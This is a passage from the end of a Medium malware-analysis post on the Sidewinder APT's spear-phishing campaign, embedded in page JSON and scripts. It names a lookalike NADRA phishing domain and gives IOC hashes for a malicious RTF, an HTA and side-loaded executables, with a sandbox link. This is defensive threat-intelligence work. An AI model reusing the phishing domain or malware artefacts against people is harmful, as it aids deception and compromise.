targetted.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":8,"end":33,"href":"http:\u002F\u002Fwww.nadra.gov.pk.d-dns.co","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_123":{"__typename":"Paragraph","id":"9376201130db_123","name":"9348","type":"P","href":null,"layout":null,"metadata":null,"text":"The nadra is the National Database of and Registration Authority.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_124":{"__typename":"Paragraph","id":"9376201130db_124","name":"8c1a","type":"P","href":null,"layout":null,"metadata":null,"text":"If you check the metada of RTF, Rashid Memorial is the author of the document.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_125":{"__typename":"Paragraph","id":"9376201130db_125","name":"3030","type":"P","href":null,"layout":null,"metadata":null,"text":"This name is really known by the navy pakistani because “Rashid Memorial Welfare Organization (RMWO) was set up by a group of dedicated retired PAF officers in 1998 in memory of Flt. Lt. Rashid Ahmed Khan, who embraced ‘Shahadat’ on 13th December, 1997 when his aircraft caught fire above a densely populated area.”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_126":{"__typename":"Paragraph","id":"9376201130db_126","name":"b8d4","type":"H3","href":null,"layout":null,"metadata":null,"text":"IOCs","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_127":{"__typename":"Paragraph","id":"9376201130db_127","name":"0510","type":"P","href":null,"layout":null,"metadata":null,"text":"File RTF:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_128":{"__typename":"Paragraph","id":"9376201130db_128","name":"43cc","type":"P","href":null,"layout":null,"metadata":null,"text":"892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_129":{"__typename":"Paragraph","id":"9376201130db_129","name":"d710","type":"P","href":null,"layout":null,"metadata":null,"text":"08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_130":{"__typename":"Paragraph","id":"9376201130db_130","name":"e810","type":"P","href":null,"layout":null,"metadata":null,"text":"hta:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_131":{"__typename":"Paragraph","id":"9376201130db_131","name":"18d8","type":"P","href":null,"layout":null,"metadata":null,"text":"b8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_132":{"__typename":"Paragraph","id":"9376201130db_132","name":"3cfe","type":"P","href":null,"layout":null,"metadata":null,"text":"Executables:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_133":{"__typename":"Paragraph","id":"9376201130db_133","name":"5ec7","type":"P","href":null,"layout":null,"metadata":null,"text":"8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 (cmpbk32.dll)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_134":{"__typename":"Paragraph","id":"9376201130db_134","name":"841f","type":"P","href":null,"layout":null,"metadata":null,"text":"13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 (winset.exe)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_135":{"__typename":"Paragraph","id":"9376201130db_135","name":"3b71","type":"P","href":null,"layout":null,"metadata":null,"text":"Sandbox execution:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_136":{"__typename":"Paragraph","id":"9376201130db_136","name":"4573","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488.rtf (MD5…\nInteractive malware hunting service. Any environments ready for live testing most type of threats. Without install…app.any.run","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":201,"href":"https:\u002F\u002Fapp.any.run\u002Ftasks\u002F779ba068-a9d5-490b-a1ec-7ebaa81e5d57","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":74,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":75,"end":190,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fapp.any.run\u002Ftasks\u002F779ba068-a9d5-490b-a1ec-7ebaa81e5d57","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*BQtQCP2DxBVQoBT6"}},"Paragraph:9376201130db_137":{"__typename":"Paragraph","id":"9376201130db_137","name":"e047","type":"H3","href":null,"layout":null,"metadata":null,"text":"Credits:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_138":{"__typename":"Paragraph","id":"9376201130db_138","name":"054f","type":"P","href":null,"layout":null,"metadata":null,"text":"Thanks to Benjamin Piot for exchange about this cases !","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:11d98531eebe-viewerId:lo_1b9321f22782":{"__typename":"UserViewerEdge","id":"userId:11d98531eebe-viewerId:lo_1b9321f22782","isMuting":false},"PostViewerEdge:postId:5bc1a7e7c84c-viewerId:lo_1b9321f22782":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:5bc1a7e7c84c-viewerId:lo_1b9321f22782"},"Tag:threat-intelligence":{"__typename":"Tag","id":"threat-intelligence","displayTitle":"Threat Intelligence","normalizedTagSlug":"threat-intelligence"},"Tag:malware-analysis":{"__typename":"Tag","id":"malware-analysis","displayTitle":"Malware Analysis","normalizedTagSlug":"malware-analysis"},"Post:5bc1a7e7c84c":{"__typename":"Post","id":"5bc1a7e7c84c","collection":null,"content({\"postMeteringOptions\":{\"referrer\":\"\"}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"6fa5","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"2ea6","startIndex":113,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:9376201130db_0"},{"__ref":"Paragraph:9376201130db_1"},{"__ref":"Paragraph:9376201130db_2"},{"__ref":"Paragraph:9376201130db_3"},{"__ref":"Paragraph:9376201130db_4"},{"__ref":"Paragraph:9376201130db_5"},{"__ref":"Paragraph:9376201130db_6"},{"__ref":"Paragraph:9376201130db_7"},{"__ref":"Paragraph:9376201130db_8"},{"__ref":"Paragraph:9376201130db_9"},{"__ref":"Paragraph:9376201130db_10"},{"__ref":"Paragraph:9376201130db_11"},{"__ref":"Paragraph:9376201130db_12"},{"__ref":"Paragraph:9376201130db_13"},{"__ref":"Paragraph:9376201130db_14"},{"__ref":"Paragraph:9376201130db_15"},{"__ref":"Paragraph:9376201130db_16"},{"__ref":"Paragraph:9376201130db_17"},{"__ref":"Paragraph:9376201130db_18"},{"__ref":"Paragraph:9376201130db_19"},{"__ref":"Paragraph:9376201130db_20"},{"__ref":"Paragraph:9376201130db_21"},{"__ref":"Paragraph:9376201130db_22"},{"__ref":"Paragraph:9376201130db_23"},{"__ref":"Paragraph:9376201130db_24"},{"__ref":"Paragraph:9376201130db_25"},{"__ref":"Paragraph:9376201130db_26"},{"__ref":"Paragraph:9376201130db_27"},{"__ref":"Paragraph:9376201130db_28"},{"__ref":"Paragraph:9376201130db_29"},{"__ref":"Paragraph:9376201130db_30"},{"__ref":"Paragraph:9376201130db_31"},{"__ref":"Paragraph:9376201130db_32"},{"__ref":"Paragraph:9376201130db_33"},{"__ref":"Paragraph:9376201130db_34"},{"__ref":"Paragraph:9376201130db_35"},{"__ref":"Paragraph:9376201130db_36"},{"__ref":"Paragraph:9376201130db_37"},{"__ref":"Paragraph:9376201130db_38"},{"__ref":"Paragraph:9376201130db_39"},{"__ref":"Paragraph:9376201130db_40"},{"__ref":"Paragraph:9376201130db_41"},{"__ref":"Paragraph:9376201130db_42"},{"__ref":"Paragraph:9376201130db_43"},{"__ref":"Paragraph:9376201130db_44"},{"__ref":"Paragraph:9376201130db_45"},{"__ref":"Paragraph:9376201130db_46"},{"__ref":"Paragraph:9376201130db_47"},{"__ref":"Paragraph:9376201130db_48"},{"__ref":"Paragraph:9376201130db_49"},{"__ref":"Paragraph:9376201130db_50"},{"__ref":"Paragraph:9376201130db_51"},{"__ref":"Paragraph:9376201130db_52"},{"__ref":"Paragraph:9376201130db_53"},{"__ref":"Paragraph:9376201130db_54"},{"__ref":"Paragraph:9376201130db_55"},{"__ref":"Paragraph:9376201130db_56"},{"__ref":"Paragraph:9376201130db_57"},{"__ref":"Paragraph:9376201130db_58"},{"__ref":"Paragraph:9376201130db_59"},{"__ref":"Paragraph:9376201130db_60"},{"__ref":"Paragraph:9376201130db_61"},{"__ref":"Paragraph:9376201130db_62"},{"__ref":"Paragraph:9376201130db_63"},{"__ref":"Paragraph:9376201130db_64"},{"__ref":"Paragraph:9376201130db_65"},{"__ref":"Paragraph:9376201130db_66"},{"__ref":"Paragraph:9376201130db_67"},{"__ref":"Paragraph:9376201130db_68"},{"__ref":"Paragraph:9376201130db_69"},{"__ref":"Paragraph:9376201130db_70"},{"__ref":"Paragraph:9376201130db_71"},{"__ref":"Paragraph:9376201130db_72"},{"__ref":"Paragraph:9376201130db_73"},{"__ref":"Paragraph:9376201130db_74"},{"__ref":"Paragraph:9376201130db_75"},{"__ref":"Paragraph:9376201130db_76"},{"__ref":"Paragraph:9376201130db_77"},{"__ref":"Paragraph:9376201130db_78"},{"__ref":"Paragraph:9376201130db_79"},{"__ref":"Paragraph:9376201130db_80"},{"__ref":"Paragraph:9376201130db_81"},{"__ref":"Paragraph:9376201130db_82"},{"__ref":"Paragraph:9376201130db_83"},{"__ref":"Paragraph:9376201130db_84"},{"__ref":"Paragraph:9376201130db_85"},{"__ref":"Paragraph:9376201130db_86"},{"__ref":"Paragraph:9376201130db_87"},{"__ref":"Paragraph:9376201130db_88"},{"__ref":"Paragraph:9376201130db_89"},{"__ref":"Paragraph:9376201130db_90"},{"__ref":"Paragraph:9376201130db_91"},{"__ref":"Paragraph:9376201130db_92"},{"__ref":"Paragraph:9376201130db_93"},{"__ref":"Paragraph:9376201130db_94"},{"__ref":"Paragraph:9376201130db_95"},{"__ref":"Paragraph:9376201130db_96"},{"__ref":"Paragraph:9376201130db_97"},{"__ref":"Paragraph:9376201130db_98"},{"__ref":"Paragraph:9376201130db_99"},{"__ref":"Paragraph:9376201130db_100"},{"__ref":"Paragraph:9376201130db_101"},{"__ref":"Paragraph:9376201130db_102"},{"__ref":"Paragraph:9376201130db_103"},{"__ref":"Paragraph:9376201130db_104"},{"__ref":"Paragraph:9376201130db_105"},{"__ref":"Paragraph:9376201130db_106"},{"__ref":"Paragraph:9376201130db_107"},{"__ref":"Paragraph:9376201130db_108"},{"__ref":"Paragraph:9376201130db_109"},{"__ref":"Paragraph:9376201130db_110"},{"__ref":"Paragraph:9376201130db_111"},{"__ref":"Paragraph:9376201130db_112"},{"__ref":"Paragraph:9376201130db_113"},{"__ref":"Paragraph:9376201130db_114"},{"__ref":"Paragraph:9376201130db_115"},{"__ref":"Paragraph:9376201130db_116"},{"__ref":"Paragraph:9376201130db_117"},{"__ref":"Paragraph:9376201130db_118"},{"__ref":"Paragraph:9376201130db_119"},{"__ref":"Paragraph:9376201130db_120"},{"__ref":"Paragraph:9376201130db_121"},{"__ref":"Paragraph:9376201130db_122"},{"__ref":"Paragraph:9376201130db_123"},{"__ref":"Paragraph:9376201130db_124"},{"__ref":"Paragraph:9376201130db_125"},{"__ref":"Paragraph:9376201130db_126"},{"__ref":"Paragraph:9376201130db_127"},{"__ref":"Paragraph:9376201130db_128"},{"__ref":"Paragraph:9376201130db_129"},{"__ref":"Paragraph:9376201130db_130"},{"__ref":"Paragraph:9376201130db_131"},{"__ref":"Paragraph:9376201130db_132"},{"__ref":"Paragraph:9376201130db_133"},{"__ref":"Paragraph:9376201130db_134"},{"__ref":"Paragraph:9376201130db_135"},{"__ref":"Paragraph:9376201130db_136"},{"__ref":"Paragraph:9376201130db_137"},{"__ref":"Paragraph:9376201130db_138"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:11d98531eebe"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"},{"__typename":"Topic","slug":"programming"}],"isLimitedState":false,"isPublished":true,"allowResponses":true,"responsesLocked":false,"visibility":"PUBLIC","latestPublishedVersion":"9376201130db","postResponses":{"__typename":"PostResponses","count":0},"responseDistribution":"NOT_DISTRIBUTED","clapCount":59,"title":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","isSeries":false,"sequence":null,"uniqueSlug":"apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","socialTitle":"","socialDek":"","canonicalUrl":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","metaDescription":"","latestPublishedAt":1531839430410,"readingTime":6.379245283018868,"previewContent":{"__typename":"PreviewContent","subtitle":"Spear phishing"},"previewImage":{"__ref":"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png"},"isShortform":false,"seoMetaTags":{"__typename":"SEOMetaTags","jsonLd":"{\"@context\":\"https:\u002F\u002Fschema.org\",\"@id\":\"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c\",\"@type\":\"SocialMediaPosting\",\"image\":[\"https:\u002F\u002Fmiro.medium.com\u002F1*UNB3nsU-2fey_uCyR0BC4w.png\"],\"url\":\"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c\",\"dateCreated\":\"2018-07-16T21:01:02Z\",\"datePublished\":\"2018-07-16T21:01:02Z\",\"dateModified\":\"2018-07-17T14:57:10Z\",\"headline\":\"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading\",\"name\":\"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading\",\"description\":\"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading Spear phishing I’ve started few days ago an analysis on a RTF following my recent researches. I found it this …\",\"identifier\":\"5bc1a7e7c84c\",\"author\":{\"@context\":\"https:\u002F\u002Fschema.org\",\"@id\":\"https:\u002F\u002Fmedium.com\u002F@sebdraven\",\"@type\":\"Person\",\"identifier\":\"sebdraven\",\"name\":\"Sebdraven\",\"url\":\"https:\u002F\u002Fmedium.com\u002F@sebdraven\"},\"creator\":{\"@context\":\"https:\u002F\u002Fschema.org\",\"@id\":\"https:\u002F\u002Fmedium.com\u002F@sebdraven\",\"@type\":\"Person\",\"identifier\":\"sebdraven\",\"name\":\"Sebdraven\",\"url\":\"https:\u002F\u002Fmedium.com\u002F@sebdraven\"},\"publisher\":{\"@context\":\"https:\u002F\u002Fschema.org\",\"@type\":\"Organization\",\"@id\":\"https:\u002F\u002Fmedium.com\",\"name\":\"Medium\",\"url\":\"https:\u002F\u002Fmedium.com\",\"logo\":{\"@type\":\"ImageObject\",\"width\":500,\"height\":110,\"url\":\"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:500\u002F7%2AV1_7XP4snlmqrc_0Njontw.png\"}},\"mainEntityOfPage\":\"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c\",\"isAccessibleForFree\":true}"},"seoDescription":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading Spear phishing I’ve started few days ago an analysis on a RTF following my recent researches. I found it this …","shortformType":"SHORTFORM_TYPE_LINK","firstPublishedAt":1531774862686,"viewerEdge":{"__ref":"PostViewerEdge:postId:5bc1a7e7c84c-viewerId:lo_1b9321f22782"},"seoTitle":"","isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:threat-intelligence"},{"__ref":"Tag:malware-analysis"}],"isFeaturedInPublishedPublication":false,"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":1346,"isPublishToEmail":false,"publishSchedule":null}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"MISS"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.90ec539d.js"></script><script src="https://cdn-client.medium.com/lite/static/js/723.128cd04d.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.4d8519c3.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.47ae8b31.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.851fdaca.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5052.eb638269.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/683.abfef39e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6062.c3638afc.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3326.53a6c411.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7566.fa51707d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7908.3b1b225d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3927.2f9f3eed.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8640.3abc29e1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9967.f31ca2af.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9214.a792bbcc.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3862.40b53c5e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1214.dda1f719.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/556.d95c90dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5094.e8fa1282.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7381.c53435ab.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9768.4b65c26f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3507.8ed91d4b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9347.fe995aea.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4929.59baa8b5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.6c66e3cc.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6954.a0b6b18e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7979.35c5b2af.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3877.af69d392.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.3f8d607c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9256.ad0fef76.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8768.62c3639c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/144.0ea6f0e3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3666.6579eeda.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1069.bbe95674.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.5de0eed7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2698.9eecb474.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.f4c0b2b4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.5b775609.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.e940a3b4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.d61aa7c4.chunk.js"></script>
<script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json">[]</script>
<script id="__LOADABLE_REQUIRED_CHUNKS___ext" type="application/json">{"namedChunks":[]}</script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'981567b74b3d0a7f',t:'MTc1ODI0NjM0Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"981567b74b3d0a7f","version":"2025.8.0","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>